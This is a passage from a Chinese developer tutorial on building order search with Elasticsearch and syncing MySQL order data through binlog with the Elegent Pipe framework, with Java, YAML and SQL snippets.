        orderDTO.<span class="hljs-title function_">setStatus</span>(<span class="hljs-number">2</span>);
        orderEsService.<span class="hljs-title function_">update</span>(<span class="hljs-string">"order"</span>,orderDTO.<span class="hljs-title function_">getId</span>()+<span class="hljs-string">""</span>,orderDTO);
    }


    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/delete"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params"/>){
        orderEsService.<span class="hljs-title function_">delete</span>(<span class="hljs-string">"order"</span>,<span class="hljs-string">"200"</span>);
    }

    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/findById/{id}"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">OrderDTO</span> <span class="hljs-title function_">findById</span>(<span class="hljs-params"> <span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">"id"</span>) <span class="hljs-built_in">String</span> id</span>){
        <span class="hljs-title class_">OrderDTO</span> order = orderEsService.<span class="hljs-title function_">findById</span>(<span class="hljs-string">"order"</span>, id);
        <span class="hljs-keyword">return</span> order;
    }

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-6">2.订单搜索</h2>
<h3 data-id="heading-7">2.1 需求分析</h3>
<p>用户在微信小程序中能够根据日期范围检索查询历史订单。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b07548397224bcfb5d9018bd3cee06f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=8GB3PidTOi0b2xH0ADOqebXB6BY%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<p>除了小程序，还有管理后台也需要订单查询功能。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a7b11b093a0b4f4c81e9c0c217a230c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=quf0Q6UnVy%2FYjtURPVeAVNCUxdY%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h3 data-id="heading-8">2.2 实现思路</h3>
<p>（1）在订单微服务，封装查询逻辑，通过使用<strong>ElegentData查询</strong>elasticsearch中的订单数据。</p>
<p>（2）在C端网关路由到订单微服务</p>
<h3 data-id="heading-9">2.3 代码实现</h3>
<h4 data-id="heading-10">2.3.1 订单微服务搜索功能的实现</h4>
<p>（1）在订单微服务的pom文件中，添加依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.data<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-data-elasticsearch7<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）在订单微服务的配置中（配置中心），添加以下配置</p>
<pre><code class="hljs language-less" lang="less">spring:
  elasticsearch:
    <span class="hljs-attribute">rest</span>:
      <span class="hljs-attribute">uris</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//127.0.0.1:9201</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）创建搜索服务类 OrderEsService</p>
<pre><code class="hljs language-scala" lang="scala"><span class="hljs-meta">@Component</span>
public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OrderEsService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Elasticsearch7DataService&lt;OrderVO&gt;</span> </span>{

}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（4）OrderService新增方法</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 搜索订单
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">pageIndex</span>
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">pageSize</span>
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">orderNo</span>
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">openId</span>
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">startDate</span>
 * <span class="hljs-doctag">@param</span> <span class="hljs-variable">endDate</span>
 * <span class="hljs-doctag">@return</span>
 */</span>
<span class="hljs-title class_">Pager</span>&lt;<span class="hljs-title class_">OrderVO</span>&gt; <span class="hljs-title function_">search</span>(<span class="hljs-title class_">Integer</span> pageIndex, <span class="hljs-title class_">Integer</span> pageSize, <span class="hljs-title class_">String</span> orderNo, <span class="hljs-title class_">String</span> openId, <span class="hljs-title class_">String</span> startDate, <span class="hljs-title class_">String</span> endDate);
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（5）OrderServiceImpl实现此方法</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Autowired</span>
<span class="hljs-keyword">private</span> <span class="hljs-title class_">OrderEsService</span> orderEsService;

<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> <span class="hljs-title class_">Pager</span>&lt;<span class="hljs-title class_">OrderVO</span>&gt; <span class="hljs-title function_">search</span>(<span class="hljs-params">Integer pageIndex, Integer pageSize, <span class="hljs-built_in">String</span> orderNo, <span class="hljs-built_in">String</span> openId, <span class="hljs-built_in">String</span> startDate, <span class="hljs-built_in">String</span> endDate</span>) {
    <span class="hljs-title class_">ElegentQueryWapper</span> elegentQueryWapper=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ElegentQueryWapper</span>();
    elegentQueryWapper.<span class="hljs-title function_">from</span>(<span class="hljs-string">"order"</span>);
    <span class="hljs-keyword">if</span>(orderNo!=<span class="hljs-literal">null</span>){
        elegentQueryWapper.<span class="hljs-title function_">eq</span>(<span class="hljs-string">"order_no"</span>,orderNo);
    }
    <span class="hljs-keyword">if</span>(openId!=<span class="hljs-literal">null</span>){
        elegentQueryWapper.<span class="hljs-title function_">eq</span>(<span class="hljs-string">"open_id"</span>,openId);
    }
    <span class="hljs-keyword">if</span>(startDate!=<span class="hljs-literal">null</span> &amp;&amp; endDate!=<span class="hljs-literal">null</span>){
        elegentQueryWapper.<span class="hljs-title function_">between</span>(  <span class="hljs-string">"create_time"</span>,startDate, endDate  );
    }
   <span class="hljs-keyword">return</span> orderEsService.<span class="hljs-title function_">page</span>(elegentQueryWapper, pageIndex, pageSize);
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（6）OrderController调用 service的search方法</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">/**
 * 搜索
 * @param pageIndex
 * @param pageSize
 * @param orderNo
 * @param openId
 * @param startDate
 * @param endDate
 * @return
 */</span>
<span class="hljs-variable">@GetMapping</span>(<span class="hljs-string">"/search"</span>)
public Pager&lt;OrderVO&gt; <span class="hljs-built_in">search</span>(
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"pageIndex"</span>,required = false,defaultValue = <span class="hljs-string">"1"</span>) Integer pageIndex,
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"pageSize"</span>,required = false,defaultValue = <span class="hljs-string">"10"</span>) Integer pageSize,
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"orderNo"</span>,required = false,defaultValue = <span class="hljs-string">""</span>) String orderNo,
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"openId"</span>,required = false,defaultValue = <span class="hljs-string">""</span>) String openId,
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"startDate"</span>,required = false,defaultValue = <span class="hljs-string">""</span>) String startDate,
        <span class="hljs-variable">@RequestParam</span>(value = <span class="hljs-string">"endDate"</span>,required = false,defaultValue = <span class="hljs-string">""</span>) String endDate){
    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">orderService</span><span class="hljs-selector-class">.search</span>(pageIndex,pageSize,orderNo,openId,startDate,endDate);
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-11">2.3.2 C端网关路由配置</h4>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">cloud:</span>
    <span class="hljs-attr">gateway:</span>
      <span class="hljs-attr">routes:</span>
      <span class="hljs-comment">#订单微服务</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">id:</span> <span class="hljs-string">order</span>
        <span class="hljs-attr">uri:</span> <span class="hljs-string">lb://order-service</span>
        <span class="hljs-attr">predicates:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">Path=/order/**</span>
        <span class="hljs-attr">filters:</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h3 data-id="heading-12">2.4 测试</h3>
<p>VSCODE的测试脚本</p>
<pre><code class="hljs language-css" lang="css">GET http://{{hostname}}:{{port}}/<span class="hljs-attribute">order</span>/search?pageIndex=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">10</span>&amp;openId=oJ9WJ5MhIS-hiwuUX0GmsHDzqTyQ&amp;startDate=<span class="hljs-number">2020</span>-<span class="hljs-number">01</span>-<span class="hljs-number">01</span>&amp;endDate=<span class="hljs-number">2023</span>-<span class="hljs-number">12</span>-<span class="hljs-number">31</span> HTTP/<span class="hljs-number">1.1</span>
<span class="hljs-attribute">Content</span>-Type: {{contentType}}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-13">3. 数据同步技术</h2>
<p>我们现在已经实现了ES数据的查询功能，但是ES数据从哪里来呀？这就需要数据同步技术实现数据从Mysql到ES的搬运。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7253a186b274e8b993929be85b8f02f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgMzYwX2dvX3BocA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764491806&amp;x-signature=9sICyHlwrTQARGDxLT0VWpQ3Pic%3D" alt="" loading="lazy"/>​</p>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/>编辑</p>
<h3 data-id="heading-14">3.1 技术方案选型</h3>
<h4 data-id="heading-15">3.1.1 MQ异步通知</h4>
<p>MQ（消息队列）异步通知是一种常见的异步通信模式，用于在分布式系统中实现解耦和异步处理。它通过将消息发送到消息队列中，然后由消费者从队列中获取消息并进行处理，实现了消息的异步传递和处理。</p>
<p>我们可以在数据的增删改方法操作上，发送数据MQ， 消费者接受数据后进行数据的同步处理。</p>
<h4 data-id="heading-16">3.1.2 canal</h4>
<p>阿里的Canal是一种开源的分布式数据库复制与实时数据订阅系统。它由阿里巴巴集团开发，旨在解决大规模分布式数据库的数据同步和实时数据订阅的需求。</p>
<p>Canal基于MySQL的主从复制原理，通过解析MySQL的binlog日志来实现数据的增量订阅和同步。它支持多种订阅方式，包括基于数据库表的增量订阅、基于全局事务的增量订阅以及基于时间点的全量订阅。Canal可以将数据库的变更数据实时地推送给订阅者，使得订阅者能够实时获取到数据库的最新数据。</p>
<h4 data-id="heading-17">3.1.3 Elegent Pipe</h4>
<p>传智教育研究院研发的一款数据同步框架。它的实现原理与Canal是类似的，都是基于MySQL的主从复制原理，通过解析MySQL的binlog日志来实现数据的增量订阅和同步。与Canal不同的是，Elegent Pipe 是分为服务端和客户端两个部分，服务端处理监听后，通过ElegentAC将数据库变动的内容发送给客户端，所以ElegentPipe 更适合微服务架构应用程序的开发。</p>
<p>开源项目地址： <a href="https://link.juejin.cn?target=https%3A%2F%2Fgitee.com%2Fchuanzhiliubei%2Felegent-pipe" title="https://gitee.com/chuanzhiliubei/elegent-pipe" target="_blank" ref="nofollow noopener noreferrer">gitee.com/chuanzhiliu…</a></p>
<h3 data-id="heading-18">3.2 Elegent Pipe快速入门</h3>
<h4 data-id="heading-19">3.2.1 开启binlog</h4>
<p>mysql8是默认开启binlog的 ，mysql5.7默认不开启.</p>
<p>我们可以通过以下命令查看binlog是否开启</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'%log_bin%'</span>;
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>要开启MySQL的binlog，您可以按照以下步骤进行操作：</p>
<ol>
<li>编辑MySQL的配置文件 <code>my.cnf</code> 或 <code>my.ini</code>，具体位置根据您的操作系统和MySQL版本而定。</li>
<li>找到并修改以下参数：</li>
</ol>

<pre><code class="hljs language-ini" lang="ini"><span class="hljs-section">[mysqld]</span>
<span class="hljs-attr">log-bin</span>=mysql-bin
<span class="hljs-attr">server-id</span>=<span class="hljs-number">1</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<ul>
<li>
<ul>
<li><code>log-bin</code>：指定binlog日志文件的前缀名称，可以根据需要自定义。</li>
<li><code>server-id</code>：指定MySQL实例的唯一标识，每个MySQL实例需要有不同的server-id。</li>
</ul>
</li>
</ul>
<ol>
<li>保存并退出配置文件。</li>
<li>重启MySQL服务，以使配置生效。</li>
</ol>
<p>开启binlog后，MySQL将开始记录所有的数据库更改操作，并将其写入binlog文件中。这些binlog文件可以用于数据恢复、数据备份、数据同步等用途。</p>
<p>请注意，在修改MySQL配置文件之前，请确保您对MySQL有足够的权限，并且备份了重要的数据。此外，开启binlog会增加MySQL的写入负载，因此在生产环境中，应该根据系统的性能和资源情况进行评估和调整。</p>
<h4 data-id="heading-20">3.2.2 代码实现</h4>
<p>（1）在服务端的工程引入依赖 （由于ElegentPipe依赖ElegentAC，所以还要引入elegent-AC-mqtt ）</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.pipe<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-pipe-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.ac<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-AC-mqtt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）在服务端的配置引入依赖</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">pipe:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">3306</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">passwd:</span> <span class="hljs-string">HuangShu_2023</span>
    <span class="hljs-attr">tables:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">demo:users</span>
  <span class="hljs-attr">ac:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">1883</span>
    <span class="hljs-attr">clientId:</span> <span class="hljs-string">transmitServer</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">admin</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">public</span>
    <span class="hljs-attr">keepAliveInterval:</span> <span class="hljs-number">30</span>
    <span class="hljs-attr">connectionTimeout:</span> <span class="hljs-number">60</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8888</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）在客户端工程引入依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.pipe<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-pipe-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.ac<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-AC-mqtt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（4）在客户端工程的配置文件添加</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">ac:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">1883</span>
    <span class="hljs-attr">clientId:</span> <span class="hljs-string">transmitClient</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">admin</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">public</span>
    <span class="hljs-attr">keepAliveInterval:</span> <span class="hljs-number">30</span>
    <span class="hljs-attr">connectionTimeout:</span> <span class="hljs-number">60</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（5）在客户端工程添加类用于处理数据增删改之后的操作</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@ElegentPipe</span>(db=<span class="hljs-string">"demo"</span>,table = <span class="hljs-string">"users"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserTransmit</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PipeService</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">insertHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改前数据："</span>+transmitDTO.<span class="hljs-title function_">getBefore</span>());
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改后数据："</span>+transmitDTO.<span class="hljs-title function_">getAfter</span>());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改前数据："</span>+transmitDTO.<span class="hljs-title function_">getBefore</span>());
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改后数据："</span>+transmitDTO.<span class="hljs-title function_">getAfter</span>());
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">deleteHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改前数据："</span>+transmitDTO.<span class="hljs-title function_">getBefore</span>());
        <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-string">"修改后数据："</span>+transmitDTO.<span class="hljs-title function_">getAfter</span>());
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-21">3.2.3 常见错误</h4>
<p>Java监听mysql的binlog 报错解决办法</p>
<p>报错：com.github.shyiko.mysql.binlog.network.AuthenticationException: Client does not support authentication protocol requested by server; consider upgrading MySQL client</p>
<p>这是你的mysql认证规则不正确导致的。</p>
<p>解决方案：在mysql中执行以下命令</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">user</span> <span class="hljs-string">'root'</span>@<span class="hljs-string">'localhost'</span> identified <span class="hljs-keyword">with</span> mysql_native_password <span class="hljs-keyword">by</span> <span class="hljs-string">'密码'</span>;  <span class="hljs-comment">--修改认证规则</span>
flush privileges; <span class="hljs-comment">--刷新权限</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h2 data-id="heading-22">4. 订单数据同步</h2>
<h3 data-id="heading-23">4.1 需求分析</h3>
<p>将订单库中的订单表数据，同步到ES中</p>
<h3 data-id="heading-24">4.2 实现思路</h3>
<p>（1）创建数据同步的服务端模块，引入elegent-pipe-server以及Springboot依赖</p>
<p>（2）在服务端模块配置文件中，配置监听dkd_order库的tb_order表。</p>
<p>（3）在订单微服务引入elegent-pipe-client</p>
<p>（4）编写数据处理类，接收数据，并通过Elegent Data Elasticsearch将数据保存到 elasticsearch中。</p>
<h3 data-id="heading-25">4.3 代码实现</h3>
<h4 data-id="heading-26">4.3.1 构建数据同步服务</h4>
<p>（1）创建dkd_pipe_service模块,Pom文件引入elegent-pipe-server以及Springboot依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.pipe<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-pipe-server<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.ac<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-AC-mqtt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）创建配置文件 application.yml</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">elegent:</span>
  <span class="hljs-attr">pipe:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">3306</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
    <span class="hljs-attr">passwd:</span> <span class="hljs-string">HuangShu_2023</span>
    <span class="hljs-attr">tables:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">dkd_order:tb_order</span>
  <span class="hljs-attr">ac:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">1883</span>
    <span class="hljs-attr">clientId:</span> <span class="hljs-string">transmitServer</span>
    <span class="hljs-attr">username:</span> <span class="hljs-string">admin</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">public</span>
    <span class="hljs-attr">keepAliveInterval:</span> <span class="hljs-number">30</span>
    <span class="hljs-attr">connectionTimeout:</span> <span class="hljs-number">60</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">application:</span>
    <span class="hljs-attr">name:</span> <span class="hljs-string">pipe-service</span>
<span class="hljs-attr">server:</span>
  <span class="hljs-attr">port:</span> <span class="hljs-number">8999</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（3）添加启动类</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@SpringBootApplication</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransmitServerApplication</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"><span class="hljs-built_in">String</span>[] args</span>){
        <span class="hljs-title class_">SpringApplication</span>.<span class="hljs-title function_">run</span>(<span class="hljs-title class_">TransmitServerApplication</span>.<span class="hljs-property">class</span>, args);
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<h4 data-id="heading-27">4.3.2 同步逻辑的实现</h4>
<p>（1）订单微服务 添加依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.pipe<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-pipe-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）订单微服务 创建数据同步处理类</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * 接受订单数据同步
 */</span>
<span class="hljs-meta">@ElegentPipe</span>(db=<span class="hljs-string">"dkd_order"</span>,table = <span class="hljs-string">"tb_order"</span>)
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPipe</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PipeService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">OrderEsService</span> orderEsService;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">insertHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Serializable</span>&gt; orderMap = transmitDTO.<span class="hljs-title function_">getAfter</span>();
